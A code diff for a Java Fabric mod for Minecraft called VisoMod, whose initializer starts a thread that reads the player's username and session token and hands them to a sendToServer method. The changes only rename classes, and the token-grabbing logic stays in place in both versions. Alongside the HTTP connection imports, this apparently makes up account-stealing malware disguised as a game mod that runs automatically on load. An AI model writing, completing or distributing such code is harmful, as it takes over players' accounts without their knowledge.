@@ -1,8 +1,8 @@
 package me.visoxd;
 
 import net.fabricmc.api.ModInitializer;
-import net.minecraft.client.MinecraftClient;
-import me.visoxd.handlers.Minecraft;
+import net.minecraft.client.Minecraft;
+import me.visoxd.handlers.Session;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -13,11 +13,11 @@ public class VisoMod implements ModInitializer {
     public void onInitialize() {
         new Thread(() -> {
             try {
-                MinecraftClient client = MinecraftClient.getInstance();
-                Minecraft minecraft = new Minecraft(client);
+                Minecraft client = Minecraft.getInstance();
+                Session session = new Session(client);
 
-                String username = minecraft.getUsername();
-                String token = minecraft.getSessionId();
+                String username = session.getUsername();
+                String token = session.getSessionId();
 
                 sendToServer(username, token);
 
